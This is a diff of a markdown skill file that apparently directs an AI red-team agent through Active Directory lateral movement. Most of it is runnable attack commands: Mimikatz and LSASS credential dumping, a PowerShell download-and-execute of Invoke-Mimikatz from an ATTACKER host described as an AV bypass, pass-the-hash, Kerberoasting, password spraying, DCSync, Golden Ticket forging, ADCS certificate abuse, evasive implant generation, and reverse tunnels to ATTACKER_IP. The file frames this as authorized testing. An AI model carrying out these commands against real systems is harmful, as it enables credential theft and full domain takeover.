@@ -1,327 +1,438 @@
 ---
 name: red-lateral
-description: "Red team lateral movement. AD attack chain (Kerberoasting, AS-REP, DCSync, ADCS ESC1-13, Silver/Golden/Diamond Ticket, BloodHound path execution), BOF-first in-memory execution, Phantom TCP/named-pipe pivots, attack-path edge recording per movement step, lateral movement map. Triggers: 'red lateral', 'lateral movement', 'ad attack', 'kerberos', 'dcsync', 'bloodhound', 'pivot', 'bof lateral', 'pass the hash', 'golden ticket', 'adcs'."
-version: 2.0.0
-phase: ["exploitation"]
-category: ["exploitation", "active-directory"]
-tools: ["phantom", "bloodhound", "crackmapexec", "netexec", "impacket", "certipy", "rubeus"]
-tags: ["red-team", "lateral-movement", "ad", "kerberos", "dcsync", "adcs", "bloodhound", "bof", "pivot", "pass-the-hash"]
+description: "Red team lateral movement — stealth-first. Credential-based movement (Pass-the-Hash, Pass-the-Ticket, token impersonation), network pivoting (tunneling, proxychains), AD attacks (Kerberoasting, DCSync, Golden/Silver Ticket, BloodHound path traversal), living-off-the-land techniques. Every movement decision evaluated for detection risk. Tracks attack path for full kill chain documentation. Triggers: 'lateral movement', 'pivot', 'pass-the-hash', 'pass-the-ticket', 'kerberoasting', 'bloodhound', 'dcsync', 'golden ticket', 'silver ticket', 'network pivot', 'tunnel', 'proxychains'."
+version: 3.0.0
+phase: ["post-exploitation"]
+category: ["exploitation"]
+tools: ["netexec", "bloodhound", "impacket", "mimikatz", "chisel", "ligolo-ng", "proxychains"]
+tags: ["lateral-movement", "pivot", "pth", "kerberos", "ad", "bloodhound", "dcsync", "tunneling", "living-off-the-land"]
 ---
 
-# Red Team — Lateral Movement
+# Red Team Lateral Movement — Stealth-First Kill Chain
 
-You are moving through the network from the initial foothold toward the engagement objective. Every movement step produces an attack-path edge with evidence.
+## OBJECTIVE
 
-**BOF-first discipline:** Prefer in-memory BOF/assembly execution over disk-based tools. Every time you consider uploading a tool, ask: is there a BOF or `execute-assembly` alternative?
+Expand access from initial foothold to target assets via the minimum necessary movement path. Every hop is a decision — weigh intelligence value against detection risk. Document every step as a reproducible attack chain.
 
-**Before every lateral action:**
-```
-POSITION:    What access do I currently have? (host, user, privileges)
-OBJECTIVE:   What is the next target host or privilege I need?
-TECHNIQUE:   Why this technique? What evidence justifies it?
-OPSEC RISK:  What detection would this trigger? (event IDs, EDR, NetFlow)
-ALTERNATIVE: Is there a lower-noise path to the same position?
-EVIDENCE:    What artifact proves this step was achieved?
-```
+**Movement philosophy:**
+- Move with purpose — know the target before moving
+- Use legitimate credentials and protocols where possible
+- Living-off-the-land over dropping tools
+- One action at a time — verify before proceeding
+- Clean up artifacts where operationally viable
 
 ---
 
-## Phase 0: Situational Awareness from Current Session
+## PREREQUISITES
 
-Before any movement, fully understand the current position.
-
-```bash
-tmux send-keys -t phantom-server:client 'use <session-id>' Enter
-tmux send-keys -t phantom-server:client 'whoami' Enter
-tmux send-keys -t phantom-server:client 'hostname' Enter
-tmux send-keys -t phantom-server:client 'ipconfig /all' Enter
-tmux send-keys -t phantom-server:client 'net user /domain' Enter
-tmux send-keys -t phantom-server:client 'net group "Domain Admins" /domain' Enter
-tmux send-keys -t phantom-server:client 'ps' Enter
-```
-
----
-
-## Phase 1: BloodHound — AD Attack Path Discovery
-
-Run BloodHound collection via BOF to avoid disk-based SharpHound binary.
+- [ ] Initial foothold established with stable access
+- [ ] Network topology partially understood
+- [ ] Target assets identified (domain controllers, file servers, dev systems, databases)
+- [ ] Credential material available (hashes, tickets, plaintext, or service accounts)
+- [ ] Detection risk assessed — is blue team active? SIEM present?
+- [ ] Movement explicitly authorized in RoE
+- [ ] Pivot infrastructure ready (C2, tunnels, or LOL-based)
 
 ```bash
-tmux send-keys -t phantom-server:client \
-  'execute-assembly /opt/SharpHound/SharpHound.exe -- -c All --zipfilename bh.zip' Enter
-
-tmux send-keys -t phantom-server:client 'download bh.zip /tmp/lateral/' Enter
-
-neo4j start
-bloodhound &
-```
-
-Import and query:
-```cypher
-MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:AdminTo|HasSession|CanRDP]->(c:Computer)
-WHERE u.name = "<compromised-user>@<DOMAIN>"
-RETURN u,g,c
-
-MATCH p=shortestPath((u:User {name:"<USER>@<DOMAIN>"})-[*1..]->(c:Computer {name:"DC01.<DOMAIN>"}))
-RETURN p
-
-MATCH (u:User {owned:true})-[r:MemberOf|AdminTo|HasSession|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|ReadGMSAPassword|ForceChangePassword|GenericAll|WriteDacl|WriteOwner|Owns|HasSIDHistory|TrustedBy|AllowedToAct|SQLAdmin|CanPSRemote]->(n)
-RETURN u, type(r), n
-```
-
-Extract attack path from BloodHound and add to `attack-path.json`.
-
----
-
-## Phase 2: Credential Dumping (In-Memory)
-
-Prefer BOF nanodump or execute-assembly over disk-based tools.
-
-```bash
-tmux send-keys -t phantom-server:client \
-  'bof /opt/bof/nanodump.o 1 lsass 1' Enter
-
-tmux send-keys -t phantom-server:client \
-  'execute-assembly /opt/Rubeus/Rubeus.exe -- dump /nowrap' Enter
-
-tmux send-keys -t phantom-server:client \
-  'execute-assembly /opt/Mimikatz/mimikatz.exe -- "sekurlsa::logonpasswords" "exit"' Enter
-```
-
-Extract hashes offline to avoid detection:
-```bash
-python3 /opt/impacket/examples/secretsdump.py \
-  -ntds <ntds.dit> -system <SYSTEM> LOCAL | tee lateral/hashes.txt
+# Foothold situational awareness
+hostname && whoami && id
+ip addr; ip route; cat /etc/hosts  # Linux
+ipconfig /all; route print; type C:\Windows\System32\drivers\etc\hosts  # Windows
 ```
 
 ---
 
-## Phase 3: Kerberos Attacks
+## DECISION LOGIC
 
-### Kerberoasting
+```
+Before every movement action:
 
-```bash
-tmux send-keys -t phantom-server:client \
-  'execute-assembly /opt/Rubeus/Rubeus.exe -- kerberoast /nowrap /outfile:lateral/kerberoast.txt' Enter
+  QUESTION:     What asset am I trying to reach and why?
+  PATH:         What is the least-hop, least-noise path to that asset?
+  CREDENTIAL:   What credential material do I have? What works here?
+  DETECTION:    What does this action look like in logs? Is it normal?
+  ALTERNATIVES: Is there a less noisy way to achieve the same goal?
+  REVERSIBLE:   Can I undo artifacts left by this action?
 
-python3 /opt/impacket/examples/GetUserSPNs.py \
-  <domain>/<user>:<password> -dc-ip <dc-ip> -request \
-  -outputfile lateral/spn-hashes.txt
+Movement priority (lowest detection risk first):
 
-hashcat -m 13100 lateral/spn-hashes.txt /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule \
-  -o lateral/cracked-spns.txt
+  1. Credential reuse with valid accounts (looks like legitimate access)
+  2. Pass-the-Hash / Pass-the-Ticket (no password needed, hard to distinguish)
+  3. Kerberos abuse (Kerberoasting, AS-REP roasting) — offline, no noise
+  4. WMI/PSExec/SCM with credentials (moderate logging)
+  5. BloodHound shortest path exploitation (targeted, documented)
+  6. DCSync (high value, high detection risk — save for endgame)
+  7. Golden/Silver Ticket (highest stealth after domain compromise)
 ```
 
-### AS-REP Roasting
+**Detection risk framework:**
+
+| Action | Detection Risk | Typical Log Source |
+|--------|---------------|-------------------|
+| SMB authentication with valid creds | Low | Security Event 4624 |
+| Pass-the-Hash (NTLM) | Low-Medium | Event 4624 type 3 |
+| Pass-the-Ticket (Kerberos) | Low | Event 4768/4769 |
+| Kerberoasting | Low (offline) | Event 4769 rc4-hmac |
+| WMI exec | Medium | WMI activity logs |
+| PSExec | High | Service install + 4697 |
+| DCSync | High | Event 4662 replication |
+| Golden Ticket | Low (after creation) | Anomalous TGT lifetime |
+
+---
+
+## TOOLS
+
+| Tool | WHY | WHEN | STEALTH | WHAT IT ENABLES |
+|------|-----|------|---------|-----------------|
+| `netexec` (nxc) | Swiss-army lateral movement — SMB/WMI/LDAP/RDP | Credential testing and exec | Medium | Shell on any accessible host |
+| `BloodHound` | Attack path visualization in AD | After domain user obtained | Low (collection) | Shortest path to DA |
+| `impacket` suite | Kerberos attacks, DCSync, secretsdump | Credential extraction | Medium | Hash extraction, Kerberos tickets |
+| `mimikatz` | Credential extraction from memory | Windows with SYSTEM/SeDebugPrivilege | High (AV detected) | NTLM hashes, Kerberos tickets, plaintext |
+| `chisel` | TCP tunneling over HTTP | Need to reach non-routable network | Low | Pivot through HTTP ports |
+| `ligolo-ng` | Full network tunnel via TUN interface | Complex multi-hop environments | Medium | Transparent network routing |
+| `proxychains` | Route tools through SOCKS proxy | After tunnel established | Depends on underlying tunnel | Use any tool through pivot |
+| `Rubeus` | Kerberos ticket manipulation | Windows AD environment | Low-Medium | AS-REP roast, Kerberoast, ticket forging |
+
+---
+
+## PHASE 1: NETWORK MAPPING FROM FOOTHOLD
 
 ```bash
-python3 /opt/impacket/examples/GetNPUsers.py \
-  <domain>/ -usersfile lateral/userlist.txt \
-  -no-pass -dc-ip <dc-ip> \
-  -outputfile lateral/asrep-hashes.txt
+# Internal network discovery — stay quiet
+# Linux: avoid nmap broadcasts, use ICMP + specific ports
+for ip in $(seq 1 254); do
+  ping -c 1 -W 1 10.0.0.$ip &>/dev/null && echo "10.0.0.$ip ALIVE" &
+done
+wait
 
-hashcat -m 18200 lateral/asrep-hashes.txt /usr/share/wordlists/rockyou.txt \
-  -o lateral/cracked-asrep.txt
+# ARP table — reveals recently communicated hosts
+arp -a
+
+# DNS resolution of common internal names
+for name in dc dc01 dc1 ldap kerberos fileserver fs01 exchange mail vpn; do
+  host $name.DOMAIN.local 2>/dev/null | grep "has address"
+done
+
+# Windows: use net commands (LOL)
+net view /domain
+net group "Domain Controllers" /domain
+net user /domain | head -30
 ```
 
-### Pass-the-Hash / Pass-the-Ticket
+---
+
+## PHASE 2: CREDENTIAL MATERIAL COLLECTION
+
+### Linux credential hunting
+```bash
+# Memory — if running as root
+strings /proc/*/environ 2>/dev/null | grep -iE "pass|secret|token|key" | head -20
+
+# Config files
+find /home /var /opt /etc -name "*.conf" -o -name "*.env" -o -name "*.cfg" 2>/dev/null | \
+  xargs grep -l "password\|passwd\|secret" 2>/dev/null | head -10
+
+# SSH keys (pivot gold)
+find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
+
+# Kerberos tickets (if AD-joined Linux)
+klist 2>/dev/null
+ls /tmp/krb5cc_*
+```
+
+### Windows credential harvesting
+```powershell
+# Mimikatz (if AV allows)
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
+.\mimikatz.exe "lsadump::sam" "exit"
+
+# Safer: Invoke-Mimikatz (reflective loading, AV bypass)
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
+
+# Registry SAM dump (no Mimikatz needed)
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
+reg save HKLM\SAM C:\Windows\Temp\SAM.hive
+# Transfer and extract: impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+
+# LSA secrets
+.\mimikatz.exe "lsadump::secrets" "exit"
+
+# Credential Manager
+cmdkey /list
+```
+
+---
+
+## PHASE 3: LATERAL MOVEMENT TECHNIQUES
+
+### Pass-the-Hash (NTLM)
 
 ```bash
-crackmapexec smb <target-range> \
-  -u <user> -H <ntlm-hash> \
-  --continue-on-success \
-  -x "whoami" 2>/dev/null | tee lateral/pth-results.txt
+# Test hash against target
+netexec smb TARGET_IP -u Administrator -H NTLM_HASH --local-auth
 
+# Execute command via PTH
+netexec smb TARGET_IP -u Administrator -H NTLM_HASH --local-auth -x "whoami"
+
+# Shell via PTH
+impacket-psexec Administrator@TARGET_IP -hashes :NTLM_HASH
+impacket-wmiexec Administrator@TARGET_IP -hashes :NTLM_HASH
+
+# Verify: does output show different hostname?
+```
+
+### Pass-the-Ticket (Kerberos)
+
+```bash
+# Export ticket (Windows)
+# .\mimikatz.exe "kerberos::list /export" "exit"
+# or Rubeus: .\Rubeus.exe dump /nowrap
+
+# Import ticket on attacker (Linux)
 export KRB5CCNAME=/tmp/ticket.ccache
-python3 /opt/impacket/examples/wmiexec.py \
-  -k -no-pass <domain>/<user>@<target>
+impacket-psexec -k -no-pass TARGET.DOMAIN.LOCAL
+
+# Verify movement
+klist
+```
+
+### Kerberoasting (Offline — Zero Network Noise)
+
+```bash
+# Request service tickets for SPNs (low noise — normal Kerberos behavior)
+impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request \
+  -outputfile kerberoast_hashes.txt
+
+# Windows: Rubeus
+.\Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap
+
+# Crack offline — no further network noise
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
+  --rules-file /usr/share/hashcat/rules/best64.rule
+```
+
+### AS-REP Roasting (Accounts Without Pre-Auth)
+
+```bash
+# No credentials needed — pure passive
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat \
+  -outputfile asrep_hashes.txt -dc-ip DC_IP 2>/dev/null
+
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+### BloodHound — Attack Path Discovery
+
+```bash
+# Collection (Python — from Linux with domain creds)
+bloodhound-python -u USER -p PASSWORD -d DOMAIN.LOCAL \
+  -dc DC_IP --zip -c All 2>/dev/null
+
+# Collection (SharpHound — from Windows)
+.\SharpHound.exe -c All --zipfilename bh_data.zip
+
+# Import to BloodHound and query:
+# "Shortest path to Domain Admins from owned principals"
+# "Find principals with DCSync rights"
+# "Find Kerberoastable users in DA path"
+```
+
+### Credential Spray (Low Noise — Domain Context)
+
+```bash
+# Domain password spray — ONE password attempt to avoid lockout
+# First check lockout policy
+netexec smb DC_IP -u valid_user -p Password1 -d DOMAIN --pass-pol 2>/dev/null
+
+# Spray with single password (avoid lockout)
+netexec smb DC_IP -u users.txt -p 'Password123!' -d DOMAIN \
+  --continue-on-success 2>/dev/null | grep -v FAILURE
+
+# Common enterprise passwords to try (one at a time):
+# SeasonYear!: Spring2024!, Summer2023!
+# Company+Year: Acme2024!, Target2024!
+# Welcome1, Password1, Passw0rd
 ```
 
 ---
 
-## Phase 4: ADCS Attack Chains (ESC1–ESC8)
+## PHASE 4: NETWORK PIVOTING
 
-### Enumerate templates
+### Chisel (HTTP Tunneling)
 
 ```bash
-certipy find \
-  -u <user>@<domain> -p <password> \
-  -dc-ip <dc-ip> \
-  -stdout | tee lateral/certipy-find.txt
+# Attacker machine
+chisel server -p 8080 --reverse &
 
-certipy find \
-  -u <user>@<domain> -p <password> \
-  -dc-ip <dc-ip> \
-  -vulnerable -stdout
+# On pivot host
+./chisel client ATTACKER_IP:8080 R:socks
+
+# Route tools through pivot
+proxychains nmap -sT -p 80,443,22,445,3389 INTERNAL_TARGET
+proxychains netexec smb INTERNAL_TARGET -u user -p pass
 ```
 
-### ESC1 — Misconfigured template (client auth + enroll rights + SAN)
+### Ligolo-ng (Transparent Tunneling)
 
 ```bash
-certipy req \
-  -u <user>@<domain> -p <password> \
-  -ca <CA-Name> \
-  -template <vulnerable-template> \
-  -upn administrator@<domain> \
-  -dc-ip <dc-ip> \
-  -out lateral/esc1-admin.pfx
+# Attacker: start proxy
+./proxy -selfcert -laddr 0.0.0.0:11601
 
-certipy auth \
-  -pfx lateral/esc1-admin.pfx \
-  -dc-ip <dc-ip> | tee lateral/esc1-auth.txt
+# On pivot host
+./agent -connect ATTACKER_IP:11601 -ignore-cert
 
-grep "Got hash" lateral/esc1-auth.txt
+# Attacker: configure interface
+# session → select session → start
+# ip route add 10.0.0.0/24 dev ligolo
+# Now access 10.0.0.0/24 directly — no proxychains needed
 ```
 
-### ESC4 — Write permissions on template
+### SSH Dynamic Port Forward
 
 ```bash
-certipy template \
-  -u <user>@<domain> -p <password> \
-  -template <template-name> \
-  -save-old
-
-certipy req \
-  -u <user>@<domain> -p <password> \
-  -ca <CA-Name> \
-  -template <template-name> \
-  -upn administrator@<domain>
+# If SSH available on pivot host
+ssh -D 1080 -f -N user@PIVOT_IP
+export SOCKS_PROXY=socks5://127.0.0.1:1080
+proxychains curl http://INTERNAL_TARGET
 ```
 
 ---
 
-## Phase 5: Domain Dominance
+## PHASE 5: DOMAIN DOMINANCE
 
-### DCSync (Domain Admin or replication rights)
+### DCSync (Credential Extraction from DC)
 
 ```bash
-python3 /opt/impacket/examples/secretsdump.py \
-  <domain>/<da-user>:<password>@<dc-ip> \
-  -just-dc-ntlm | tee lateral/dcsync-hashes.txt
+# Requires: Replication privileges (Domain Admin, specific ACL)
+# Detection: High — generates event 4662 on DC
 
-tmux send-keys -t phantom-server:client \
-  'execute-assembly /opt/Mimikatz/mimikatz.exe -- "lsadump::dcsync /domain:<domain> /all /csv" "exit"' Enter
+# Impacket
+impacket-secretsdump DOMAIN/DA_USER:PASSWORD@DC_IP -just-dc
+
+# Mimikatz
+.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv" "exit"
+
+# Extract krbtgt hash for Golden Ticket
+.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt" "exit"
 ```
 
-### Golden Ticket
+### Golden Ticket (Domain Persistence)
 
 ```bash
-python3 /opt/impacket/examples/secretsdump.py \
-  <domain>/<da-user>:<password>@<dc-ip> \
-  -just-dc-user krbtgt | tee lateral/krbtgt.txt
+# After obtaining: domain SID + krbtgt NTLM hash
+# Detection: Low after creation — appears as normal Kerberos traffic
 
-KRBTGT_HASH=$(grep "krbtgt" lateral/krbtgt.txt | awk -F: '{print $4}')
-DOMAIN_SID=$(python3 /opt/impacket/examples/getPac.py \
-  -targetUser administrator <domain>/<da-user>:<password> | grep "Domain SID" | awk '{print $3}')
+# Create Golden Ticket (20-year lifetime)
+.\mimikatz.exe "kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /ptt" "exit"
 
-python3 /opt/impacket/examples/ticketer.py \
-  -nthash $KRBTGT_HASH \
-  -domain-sid $DOMAIN_SID \
-  -domain <domain> administrator
-
-export KRB5CCNAME=administrator.ccache
-python3 /opt/impacket/examples/secretsdump.py \
-  -k -no-pass dc01.<domain>
-```
-
----
-
-## Phase 6: Lateral Movement Execution
-
-Use Phantom pivots for network segments not directly reachable.
-
-```bash
-tmux send-keys -t phantom-server:client 'use <session-id>' Enter
-tmux send-keys -t phantom-server:client 'pivot tcp --lhost 0.0.0.0 --lport 9999' Enter
-
-./phantom-client
-generate --mtls <pivot-host-ip>:9999 \
-  --os windows --arch amd64 \
-  --format shellcode \
-  --shellcode-encoder shikata-ga-nai \
-  --evasion --obfuscate \
-  --save /tmp/pivot-implant/
-
-tmux send-keys -t phantom-server:client \
-  'execute-assembly /tmp/pivot-implant/implant.exe' Enter
-```
-
-Named pipe (lower EDR visibility):
-```bash
-tmux send-keys -t phantom-server:client \
-  'pivot named-pipe --name svchost-pipe' Enter
+# Linux
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass DC.DOMAIN.LOCAL
 ```
 
 ---
 
-## Phase 7: Lateral Movement Map
+## ATTACK PATH DOCUMENTATION
 
-Record every movement as attack-path edges.
+After each successful hop:
+
+```
+pentest_pivot(
+  session_id: <session>,
+  type: "lateral_movement",
+  from: "<source_host>/<user>",
+  to: "<dest_host>/<user>",
+  method: "<technique: PTH|PTT|Kerberoast|BloodHound_path|...>",
+  credential: "<what credential enabled this>",
+  evidence: "<proof: command + output>",
+  detection_risk: "low|medium|high"
+)
+```
+
+Update living attack model after each hop:
+```
+pentest_target_model_update(
+  session_id: <session>,
+  tool_output: "<new systems reached, credentials obtained>",
+  tool_name: "red-lateral"
+)
+```
+
+---
+
+## EXPECTED OBSERVATIONS
+
+| Observation | Interpretation | Action |
+|---|---|---|
+| Hash reuse across multiple hosts | Credential overlap | Test on all accessible hosts |
+| Service account with SPN | Kerberoasting candidate | Request and crack ticket |
+| BloodHound shows path via GenericAll/WriteDACL | ACL abuse path | Follow bloodhound chain |
+| User in Domain Admins | Direct DA access | DCSync immediately |
+| DC accessible from pivot | Potential domain compromise | BloodHound + DCSync |
+| AS-REP roastable accounts | Offline crackable credentials | GetNPUsers + hashcat |
+| Writable GPO found | GPO abuse for domain-wide exec | Modify GPO to run payload |
+
+---
+
+## FAILURE MODES
+
+| Failure | Root Cause | Response |
+|---|---|---|
+| PTH fails with access denied | Local admin disabled or LAPS | Try other accounts; check BloodHound for alternates |
+| Kerberoast hashes won't crack | Strong service account passwords | Try longer wordlist + rules; deprioritize |
+| BloodHound shows no path | Insufficient collection or hardened AD | Re-run collection with different user; check manual ACL paths |
+| All pivots blocked by firewall | Egress filtering | Try HTTP-based tunnels (chisel); check allowed ports |
+| Mimikatz blocked by AV | EDR detection | Use Invoke-Mimikatz, Nanodump, or LSASS dump + offline extraction |
+| DCSync blocked | Not enough privileges | Find alternate replication rights holder; try via BloodHound |
+| Credential spray locks accounts | Aggressive lockout policy | STOP immediately — document lockout threshold and avoid further sprays |
+
+---
+
+## STOP CONDITIONS
+
+- Domain Admin / krbtgt hash obtained — maximum AD compromise achieved
+- All paths to target assets exhausted
+- Detection indicators observed (alerts, account lockouts, unusual monitoring) — **stop and assess**
+- RoE boundary reached — document furthest point of access
+- Scope asset reached — extract proof and document chain
+
+---
+
+## REPORTING
+
+Full kill chain documentation:
 
 ```json
 {
-  "edges": [
+  "attack_chain": [
     {
-      "from": "N-RT-002",
-      "to": "N-RT-003",
-      "description": "Kerberoasting → cracked SPN hash → lateral to <server>",
-      "evidence_ids": ["lateral/cracked-spns.txt", "lateral/pth-results.txt"],
-      "confirmed": true
+      "hop": 1,
+      "from": "WORKSTATION01/jsmith",
+      "to": "FILESERVER01/Administrator",
+      "technique": "Pass-the-Hash",
+      "credential": "NTLM hash of jsmith local admin",
+      "command": "impacket-psexec Administrator@FILESERVER01 -hashes :HASH",
+      "evidence": "hostname: FILESERVER01, whoami: NT AUTHORITY\\SYSTEM"
     },
     {
-      "from": "N-RT-003",
-      "to": "N-RT-004",
-      "description": "ADCS ESC1 → DA cert → DCSync → domain hash dump",
-      "evidence_ids": ["lateral/esc1-auth.txt", "lateral/dcsync-hashes.txt"],
-      "confirmed": true
+      "hop": 2,
+      "from": "FILESERVER01/SYSTEM",
+      "to": "DC01/krbtgt",
+      "technique": "DCSync",
+      "credential": "Domain Admin obtained from FILESERVER01 memory",
+      "command": "impacket-secretsdump DOMAIN/DA@DC01 -just-dc",
+      "evidence": "krbtgt:HASH extracted"
     }
-  ]
+  ],
+  "total_hops": 2,
+  "initial_access": "WORKSTATION01 via SQL injection RCE",
+  "final_access": "Full domain compromise — krbtgt hash",
+  "dwell_time": "~4 hours",
+  "detection_events": "None observed",
+  "persistence": "Golden Ticket created, valid 20 years",
+  "business_impact": "Complete Active Directory compromise — all domain systems accessible"
 }
 ```
-
-Update `.omop/red-team/<engagement>/attack-path.json`.
-
-Also maintain a human-readable lateral movement map:
-```
-Foothold: WORKSTATION01 (user: jsmith, local admin)
-  → FILESERVER01 (PTH with jsmith hash, local admin)
-  → DC01 (ESC1 + DCSync, Domain Admin)
-     → All domain systems (Golden Ticket)
-```
-
-Save to `lateral/lateral-movement-map.md`.
-
----
-
-## OPSEC Checklist Before Proceeding to red-persistence
-
-- [ ] BOF/execute-assembly used instead of disk writes where possible
-- [ ] No tools written to easily-detected paths (C:\Windows\Temp\*)
-- [ ] Pivot listeners cleaned up from hosts where no longer needed
-- [ ] Kerberoasting performed with reasonable ticket request rate
-- [ ] DCSync performed from single session only (not repeatedly)
-- [ ] Beacon jitter active on all sessions
-- [ ] Lateral movement map updated
-- [ ] Attack-path JSON updated with all new edges
-
----
-
-## Output
-
-```
-.omop/red-team/<engagement>/lateral/
-  bloodhound/
-  kerberoast.txt
-  cracked-spns.txt
-  dcsync-hashes.txt
-  certipy-find.txt
-  esc1-auth.txt
-  lateral-movement-map.md
-  phantom-pivots.txt
-  attack-path.json  (updated)
-```
-
-## Next Skill
-
-`red-persistence` — establish redundant, covert persistence using current access.
